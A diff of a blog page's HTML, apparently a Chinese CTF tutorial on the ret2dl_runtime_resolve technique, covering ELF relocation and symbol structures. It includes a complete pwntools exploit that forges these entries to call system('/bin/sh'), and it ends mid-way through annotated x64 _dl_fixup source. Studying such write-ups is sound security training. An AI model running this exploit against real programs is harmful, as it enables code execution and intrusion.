-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span></span><br><span class="hljs-class">  &#123;</span><br>    <span class="hljs-comment">/* These first few members are part of the protocol with the debugger.</span><br><span class="hljs-comment">       This is the same format used in SVR4.  */</span><br><br>    ElfW(Addr) l_addr;    <span class="hljs-comment">/* Base address shared object is loaded at.  */</span><br>    <span class="hljs-type">char</span> *l_name;     <span class="hljs-comment">/* Absolute file name object was found in.  */</span><br>    ElfW(Dyn) *l_ld;      <span class="hljs-comment">/* Dynamic section of the shared object.  */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span> *<span class="hljs-title">l_next</span>, *<span class="hljs-title">l_prev</span>;</span> <span class="hljs-comment">/* Chain of loaded objects.  */</span><br>&#125;;<br><br></code></pre></td></tr></table></figure>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span></span><br><span class="hljs-class">  &#123;</span><br>    <span class="hljs-comment">/* These first few members are part of the protocol with the debugger.</span><br><span class="hljs-comment">       This is the same format used in SVR4.  */</span><br><br>    ElfW(Addr) l_addr;    <span class="hljs-comment">/* Base address shared object is loaded at.  */</span><br>    <span class="hljs-type">char</span> *l_name;     <span class="hljs-comment">/* Absolute file name object was found in.  */</span><br>    ElfW(Dyn) *l_ld;      <span class="hljs-comment">/* Dynamic section of the shared object.  */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span> *<span class="hljs-title">l_next</span>, *<span class="hljs-title">l_prev</span>;</span> <span class="hljs-comment">/* Chain of loaded objects.  */</span><br>&#125;;<br><br></code></pre></td></tr></table></figure></div>
 
-<p>第三个参数即为.dynamic的地址<br><img src="https://res.cloudinary.com/drdpahj9c/image/upload/v1754829225/2025/08/e328258e21b57ba92b2dbcd6e9b55734.png"></p>
+<p>第三个参数即为.dynamic的地址<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1754829225/2025/08/e328258e21b57ba92b2dbcd6e9b55734.png"
+                     
+                ></p>
 <p><code>readelf -d file</code>查看一下.dynamic内容</p>
-<p><img src="https://res.cloudinary.com/drdpahj9c/image/upload/v1754829228/2025/08/a619508160ffafc300ae1ce5485e9b55.png"></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1754829228/2025/08/a619508160ffafc300ae1ce5485e9b55.png"
+                     
+                ></p>
 <p>.dynstm .dynstr和.rel.plt的偏移分别为9，10，16.结合ELF32_Dyn为8字节，实际的值在后面4节，因此可以得到他们的偏移分别是<code>9*8-4</code>，<code>10*8-4</code>可以对应去取出相应的内容。</p>
 <p>rel.plt加上reloc_index就定位了ELF32_Rel指针，即0x804833c + 0</p>
-<p><img src="https://res.cloudinary.com/drdpahj9c/image/upload/v1754829229/2025/08/07d5bb5a0752db34589e8bade9e437cc.png"></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1754829229/2025/08/07d5bb5a0752db34589e8bade9e437cc.png"
+                     
+                ></p>
 <p>ELF32_Rel源码如下</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>  Elf32_Addr   r_offset;     <span class="hljs-comment">/* Address */</span><br>  Elf32_Word   r_info;          <span class="hljs-comment">/* Relocation type and symbol index */</span><br>&#125; Elf32_Rel;<br><br></code></pre></td></tr></table></figure>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>  Elf32_Addr   r_offset;     <span class="hljs-comment">/* Address */</span><br>  Elf32_Word   r_info;          <span class="hljs-comment">/* Relocation type and symbol index */</span><br>&#125; Elf32_Rel;<br><br></code></pre></td></tr></table></figure></div>
 
 <p>根据ida中图得知，r_offset即 0x804a00c，是got.plt的地址，最后的解析地址也将会放入这里，r_inf0 &#x3D; 0x107</p>
 <p>而将r_info&gt;&gt;8作为dynsym的下标，即0x107&gt;&gt;8&#x3D;1  即右移8位</p>
-<p><img src="https://res.cloudinary.com/drdpahj9c/image/upload/v1754829232/2025/08/55898692e61b608d013e0324c2062750.png"></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1754829232/2025/08/55898692e61b608d013e0324c2062750.png"
+                     
+                ></p>
 <p>Elf32_Sym的源码如下</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>  </span><br><span class="hljs-class">&#123;</span>  <br>  Elf32_Word   st_name;      <span class="hljs-comment">/* Symbol name (string tbl index) */</span>  <br>  Elf32_Addr   st_value;     <span class="hljs-comment">/* Symbol value */</span>  <br>  Elf32_Word   st_size;      <span class="hljs-comment">/* Symbol size */</span>  <br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>    st_info;      <span class="hljs-comment">/* Symbol type and binding */</span>  <br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>    st_other;     <span class="hljs-comment">/* Symbol visibility */</span>  <br>  Elf32_Section    st_shndx;     <span class="hljs-comment">/* Section index */</span>  <br>&#125; Elf32_Sym;<br></code></pre></td></tr></table></figure>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>  </span><br><span class="hljs-class">&#123;</span>  <br>  Elf32_Word   st_name;      <span class="hljs-comment">/* Symbol name (string tbl index) */</span>  <br>  Elf32_Addr   st_value;     <span class="hljs-comment">/* Symbol value */</span>  <br>  Elf32_Word   st_size;      <span class="hljs-comment">/* Symbol size */</span>  <br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>    st_info;      <span class="hljs-comment">/* Symbol type and binding */</span>  <br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>    st_other;     <span class="hljs-comment">/* Symbol visibility */</span>  <br>  Elf32_Section    st_shndx;     <span class="hljs-comment">/* Section index */</span>  <br>&#125; Elf32_Sym;<br></code></pre></td></tr></table></figure></div>
 
 <p>第一个st_name就是.dynstr距离函数名的偏移。</p>
-<p><img src="https://res.cloudinary.com/drdpahj9c/image/upload/v1754829234/2025/08/baebc85cf654dc988aa3a35465ee2be4.png"></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1754829234/2025/08/baebc85cf654dc988aa3a35465ee2be4.png"
+                     
+                ></p>
 <p>偏移即为20</p>
-<p><img src="https://res.cloudinary.com/drdpahj9c/image/upload/v1754829236/2025/08/30f6909d006cd4b54b681b1691d5fe65.png"></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1754829236/2025/08/30f6909d006cd4b54b681b1691d5fe65.png"
+                     
+                ></p>
 <p>.dynstr首地址加上0x20就是read的函数名</p>
 <p>最后</p>
-<p><img src="https://res.cloudinary.com/drdpahj9c/image/upload/v1754829239/2025/08/73abd993c00ca0b0dc43cb727708b8ff.png"></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1754829239/2025/08/73abd993c00ca0b0dc43cb727708b8ff.png"
+                     
+                ></p>
 <p>调用dl_lookup_symbol_x,在动态链接库中搜索。</p>
 <h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>上述过程总结一下</p>
 <p>我们的目的是找到函数名称字符串的地址，交给dl_lookup_symbol_x去libc中寻找。</p>
@@ -271,19 +464,19 @@
 <p>Elf32_Sym中的第一个参数st_name存放着函数名称字符串距离.dynstr首地址的偏移，如此便得到了函数名称字符串</p>
 <h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>清楚了上面流程，发现最后dl_lookup_symbol_x函数回去搜索字符串，但是不会检查是否是此时延迟绑定的函数。同时没有检查重定位表的边界，dl_runtime_resolve的第二个参数reloc_index可以很大，超过.rel.plt范围。</p>
 <p>因此我们可以伪造第二个参数,使其偏移到我们的可控内存，再按照上面流程，伪造一系列结构，最后让距离</p>
-<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><h4 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">vuln</span><span class="hljs-params">()</span><br>&#123;<br>  _BYTE buf[<span class="hljs-number">40</span>]; <span class="hljs-comment">// [esp+0h] [ebp-28h] BYREF</span><br><br>  <span class="hljs-keyword">return</span> read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x100u</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><h4 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h4><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">vuln</span><span class="hljs-params">()</span><br>&#123;<br>  _BYTE buf[<span class="hljs-number">40</span>]; <span class="hljs-comment">// [esp+0h] [ebp-28h] BYREF</span><br><br>  <span class="hljs-keyword">return</span> read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x100u</span>);<br>&#125;<br></code></pre></td></tr></table></figure></div>
 
 <p>只有一个read，没有打印函数</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><br>  <br><br>p = process(<span class="hljs-string">&#x27;./ret2dl&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./ret2dl&#x27;</span>)<br><span class="hljs-comment">#libc = ELF(&quot;./libc-2.27.so&quot;)</span><br><br>  <br><br><span class="hljs-comment">#p =remote(&#x27;node4.anna.nssctf.cn&#x27;,28537)</span><br>context.terminal = [<span class="hljs-string">&#x27;wt.exe&#x27;</span>, <span class="hljs-string">&#x27;wsl&#x27;</span>, <span class="hljs-string">&#x27;bash&#x27;</span>, <span class="hljs-string">&#x27;-c&#x27;</span>]<br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,arch = elf.arch,os = elf.os)<br><br>  <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br>    pause()<br><br>  <br><br>plt0 = elf.get_section_by_name(<span class="hljs-string">&#x27;.plt&#x27;</span>).header.sh_addr<br>rel_plt = elf.get_section_by_name(<span class="hljs-string">&#x27;.rel.plt&#x27;</span>).header.sh_addr<br>dynsym = elf.get_section_by_name(<span class="hljs-string">&#x27;.dynsym&#x27;</span>).header.sh_addr<br>dynstr = elf.get_section_by_name(<span class="hljs-string">&#x27;.dynstr&#x27;</span>).header.sh_addr<br><br>  <br>offset = <span class="hljs-number">0x28</span> + <span class="hljs-number">4</span><br>read_plt = elf.plt[<span class="hljs-string">&#x27;read&#x27;</span>]<br>pop_ebx_esi_edi_ebp_ret = <span class="hljs-number">0x080485d8</span><br>leave_ret = <span class="hljs-number">0x0804852b</span><br><span class="hljs-comment">#bss = 0x804a040</span><br>base_addr = <span class="hljs-number">0x0804a800</span><br><br>  <br>fake_sym_addr=base_addr+<span class="hljs-number">32</span><br>align=<span class="hljs-number">0x10</span>-((fake_sym_addr-dynsym)&amp;<span class="hljs-number">0xf</span>) <span class="hljs-comment">#16字节对齐</span><br>fake_sym_addr+=align<br>st_name=fake_sym_addr+<span class="hljs-number">0x10</span>-dynstr<br>st_info=<span class="hljs-number">12</span><br>fake_sym=p32(st_name)+p32(<span class="hljs-number">0</span>)+p32(<span class="hljs-number">0</span>)+p32(st_info) <span class="hljs-comment">#伪造Elf32_Sym</span><br><br>  <br>r_offset = elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br>r_sym=(fake_sym_addr-dynsym)/<span class="hljs-number">0x10</span><br>r_type=<span class="hljs-number">0x7</span><br>r_info=(<span class="hljs-built_in">int</span>(r_sym)&lt;&lt;<span class="hljs-number">8</span>)+(r_type&amp;<span class="hljs-number">0xf</span>)<br>reloc_index=base_addr-rel_plt+<span class="hljs-number">24</span><br>fake_rel_plt=p32(r_offset)+p32(r_info)<br><br>  <br><br><span class="hljs-comment">#debug()</span><br>payload=offset*<span class="hljs-string">b&#x27;a&#x27;</span><br>payload+=p32(read_plt)<br>payload+=p32(pop_ebx_esi_edi_ebp_ret)<br>payload+=p32(<span class="hljs-number">0</span>)<br>payload+=p32(base_addr)<br>payload+=p32(<span class="hljs-number">100</span>)<br>payload+=p32(base_addr-<span class="hljs-number">4</span>)<br>payload+=p32(leave_ret)<br>p.sendline(payload)<br><br>  <br>debug()<br>payload1=p32(plt0)<br>payload1+=p32(reloc_index)<br>payload1+= p32(<span class="hljs-number">0</span>)<br>payload1+=p32(base_addr+<span class="hljs-number">80</span>)<br>payload1+=p32(<span class="hljs-number">0</span>)<br>payload1+=p32(<span class="hljs-number">0</span>)<br>payload1+=fake_rel_plt<br>payload1+=align*<span class="hljs-string">b&#x27;a&#x27;</span><br>payload1+=fake_sym<br>payload1+=<span class="hljs-string">b&#x27;system\x00&#x27;</span><br>payload1+=(<span class="hljs-number">80</span>-<span class="hljs-built_in">len</span>(payload))*<span class="hljs-string">b&#x27;a&#x27;</span><br>payload1+=<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span><br><br>  <br>p.send(payload1)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><br>  <br><br>p = process(<span class="hljs-string">&#x27;./ret2dl&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./ret2dl&#x27;</span>)<br><span class="hljs-comment">#libc = ELF(&quot;./libc-2.27.so&quot;)</span><br><br>  <br><br><span class="hljs-comment">#p =remote(&#x27;node4.anna.nssctf.cn&#x27;,28537)</span><br>context.terminal = [<span class="hljs-string">&#x27;wt.exe&#x27;</span>, <span class="hljs-string">&#x27;wsl&#x27;</span>, <span class="hljs-string">&#x27;bash&#x27;</span>, <span class="hljs-string">&#x27;-c&#x27;</span>]<br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,arch = elf.arch,os = elf.os)<br><br>  <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br>    pause()<br><br>  <br><br>plt0 = elf.get_section_by_name(<span class="hljs-string">&#x27;.plt&#x27;</span>).header.sh_addr<br>rel_plt = elf.get_section_by_name(<span class="hljs-string">&#x27;.rel.plt&#x27;</span>).header.sh_addr<br>dynsym = elf.get_section_by_name(<span class="hljs-string">&#x27;.dynsym&#x27;</span>).header.sh_addr<br>dynstr = elf.get_section_by_name(<span class="hljs-string">&#x27;.dynstr&#x27;</span>).header.sh_addr<br><br>  <br>offset = <span class="hljs-number">0x28</span> + <span class="hljs-number">4</span><br>read_plt = elf.plt[<span class="hljs-string">&#x27;read&#x27;</span>]<br>pop_ebx_esi_edi_ebp_ret = <span class="hljs-number">0x080485d8</span><br>leave_ret = <span class="hljs-number">0x0804852b</span><br><span class="hljs-comment">#bss = 0x804a040</span><br>base_addr = <span class="hljs-number">0x0804a800</span><br><br>  <br>fake_sym_addr=base_addr+<span class="hljs-number">32</span><br>align=<span class="hljs-number">0x10</span>-((fake_sym_addr-dynsym)&amp;<span class="hljs-number">0xf</span>) <span class="hljs-comment">#16字节对齐</span><br>fake_sym_addr+=align<br>st_name=fake_sym_addr+<span class="hljs-number">0x10</span>-dynstr<br>st_info=<span class="hljs-number">12</span><br>fake_sym=p32(st_name)+p32(<span class="hljs-number">0</span>)+p32(<span class="hljs-number">0</span>)+p32(st_info) <span class="hljs-comment">#伪造Elf32_Sym</span><br><br>  <br>r_offset = elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br>r_sym=(fake_sym_addr-dynsym)/<span class="hljs-number">0x10</span><br>r_type=<span class="hljs-number">0x7</span><br>r_info=(<span class="hljs-built_in">int</span>(r_sym)&lt;&lt;<span class="hljs-number">8</span>)+(r_type&amp;<span class="hljs-number">0xf</span>)<br>reloc_index=base_addr-rel_plt+<span class="hljs-number">24</span><br>fake_rel_plt=p32(r_offset)+p32(r_info)<br><br>  <br><br><span class="hljs-comment">#debug()</span><br>payload=offset*<span class="hljs-string">b&#x27;a&#x27;</span><br>payload+=p32(read_plt)<br>payload+=p32(pop_ebx_esi_edi_ebp_ret)<br>payload+=p32(<span class="hljs-number">0</span>)<br>payload+=p32(base_addr)<br>payload+=p32(<span class="hljs-number">100</span>)<br>payload+=p32(base_addr-<span class="hljs-number">4</span>)<br>payload+=p32(leave_ret)<br>p.sendline(payload)<br><br>  <br>debug()<br>payload1=p32(plt0)<br>payload1+=p32(reloc_index)<br>payload1+= p32(<span class="hljs-number">0</span>)<br>payload1+=p32(base_addr+<span class="hljs-number">80</span>)<br>payload1+=p32(<span class="hljs-number">0</span>)<br>payload1+=p32(<span class="hljs-number">0</span>)<br>payload1+=fake_rel_plt<br>payload1+=align*<span class="hljs-string">b&#x27;a&#x27;</span><br>payload1+=fake_sym<br>payload1+=<span class="hljs-string">b&#x27;system\x00&#x27;</span><br>payload1+=(<span class="hljs-number">80</span>-<span class="hljs-built_in">len</span>(payload))*<span class="hljs-string">b&#x27;a&#x27;</span><br>payload1+=<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span><br><br>  <br>p.send(payload1)<br>p.interactive()<br></code></pre></td></tr></table></figure></div>
 
 
 
 <h4 id="x64"><a href="#x64" class="headerlink" title="x64"></a>x64</h4><p>x64如果按照x86一样伪造间接控制重定向的各表项，会出现问题。<br>原因是在_dl_fixup函数执行过程中，访问到了一段未映射的地址</p>
 <p>查看dl_fixup的完整源码分析<a href="#x64">ret2_dl_runtime_resolve</a></p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs c">_dl_fixup (<span class="hljs-keyword">struct</span> link_map *l, ElfW(Word) reloc_arg) <span class="hljs-comment">// 第一个参数link_map，也就是got[1]</span><br>&#123;<br>    <span class="hljs-comment">// 获取link_map中存放DT_SYMTAB的地址</span><br>  <span class="hljs-type">const</span> <span class="hljs-title function_">ElfW</span><span class="hljs-params">(Sym)</span> *<span class="hljs-type">const</span> symtab = (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);<br>    <span class="hljs-comment">// 获取link_map中存放DT_STRTAB的地址</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *strtab = (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *) D_PTR (l, l_info[DT_STRTAB]);<br>	<span class="hljs-comment">// reloc_offset就是reloc_arg,获取重定位表项中对应函数的结构体</span><br>  <span class="hljs-type">const</span> PLTREL *<span class="hljs-type">const</span> reloc = (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);<br>    <span class="hljs-comment">// 根据重定位结构体的r_info得到symtab表中对应的结构体</span><br>  <span class="hljs-type">const</span> <span class="hljs-title function_">ElfW</span><span class="hljs-params">(Sym)</span> *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];<br>    <br>  <span class="hljs-type">void</span> *<span class="hljs-type">const</span> rel_addr = (<span class="hljs-type">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);<br>  <span class="hljs-type">lookup_t</span> result;<br>  DL_FIXUP_VALUE_TYPE value;<br><br>  <span class="hljs-comment">/* Sanity check that we&#x27;re really looking at a PLT relocation.  */</span><br>  assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT); <span class="hljs-comment">// 检查r_info的最低位是不是7</span><br><br>   <span class="hljs-comment">/* Look up the target symbol.  If the normal lookup rules are not</span><br><span class="hljs-comment">      used don&#x27;t look in the global scope.  */</span><br>  <span class="hljs-keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="hljs-number">0</span>) == <span class="hljs-number">0</span>) <span class="hljs-comment">// 这里是一层检测，检查sym结构体中的st_other是否为0，正常情况下为0，执行下面代码</span><br>    &#123;<br>      <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">r_found_version</span> *<span class="hljs-title">version</span> =</span> <span class="hljs-literal">NULL</span>;<br>	<span class="hljs-comment">// 这里也是一层检测，检查link_map中的DT_VERSYM是否为NULL，正常情况下不为NULL，执行下面代码</span><br>      <span class="hljs-keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="hljs-literal">NULL</span>)<br>	&#123;<br>      <span class="hljs-comment">// 到了这里就是64位下报错的位置，在计算版本号时，vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff的过程中，由于我们一般伪造的symtab位于bss段，就导致在64位下reloc-&gt;r_info比较大,故程序会发生错误。所以要使程序不发生错误，自然想到的办法就是不执行这里的代码，分析上面的代码我们就可以得到两种手段，第一种手段就是使上一行的if不成立，也就是设置link_map中的DT_VERSYM为NULL，那我们就要泄露出link_map的地址，而如果我们能泄露地址，根本用不着ret2dlresolve。第二种手段就是使最外层的if不成立，也就是使sym结构体中的st_other不为0，直接跳到后面的else语句执行。</span><br>	  <span class="hljs-type">const</span> <span class="hljs-title function_">ElfW</span><span class="hljs-params">(Half)</span> *vernum = (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);<br>	  ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="hljs-number">0x7fff</span>;<br>	  version = 